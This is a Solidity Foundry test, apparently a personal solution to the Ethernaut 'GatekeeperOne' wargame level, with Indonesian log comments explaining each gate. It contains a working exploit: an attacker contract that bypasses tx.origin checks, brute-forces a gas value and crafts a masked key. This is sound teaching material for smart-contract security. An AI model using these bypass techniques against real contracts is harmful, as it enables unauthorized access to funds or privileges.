// SPDX-License-Identifier: MIT
pragma solidity ^0.8;

import "forge-std/Test.sol";
import "../Ethernaut.sol";
import "../14-GatekeeperOne/GatekeeperOneFactory.sol";

contract GatekeeperOneAttack is Test {
    function testGatekeeperOne() external {
        vm.createSelectFork(vm.envString("sepolia"));
        address kiper = makeAddr("kiper");
        Ethernaut ethernaut = new Ethernaut();
        GatekeeperOneFactory factory = new GatekeeperOneFactory();
        ethernaut.registerLevel(factory);
        vm.startPrank(kiper, kiper);
        address addr = ethernaut.createLevelInstance(factory);
        GatekeeperOne gate = GatekeeperOne(addr);
        emit log("setup done!\nGoal: entrant == tx.origin");
        bool beda = gate.entrant() != kiper;
        assertTrue(beda);
        emit log("ada 3 modifier:");
        emit log("1. tx.origin != msg.sender, berarti harus dipanggil dari kontrak lain");
        OpenGate open = new OpenGate(address(gate));
        emit log("3. agak rumit, mari kita bongkar:");
        emit log("0x0000B7B8 == 0xB7B8, artinya byte ke 4 dan 5 harus 0000");
        emit log("0xB?B?B?B?0000B7B8 != 0xB1B2B3B40000B7B8, artinya B1B2B3B4 tidak boleh 0");
        emit log("0x00000B7B8 == 0xB7B8 (B7 dan B8 adalah byte terakhir tx.origin)");
        emit log("masking 4 bytes pertama");
        emit log(
            "2. gasleft() adalah sisa gas setelah memanggil fungsi, dan modifier kedua mengaharuskan sisa gas dibagi 8191 hasilnya tidak ada sisa"
        );
        for (uint256 i = 0; i < 8191; i++) {
            try open.attack{gas: 8000000 + i}() {
                break;
            } catch {}
        }
        emit log("submit");
        bool sukses = ethernaut.submitLevelInstance(payable(addr));
        assertTrue(sukses);
    }
}

contract OpenGate {
    GatekeeperOne gate;

    constructor(address a) {
        gate = GatekeeperOne(a);
    }

    function attack() external {
        bytes8 key = bytes8(uint64(uint160((tx.origin)))) & 0xFFFFFFFF0000FFFF;
        gate.enter(key);
    }
}
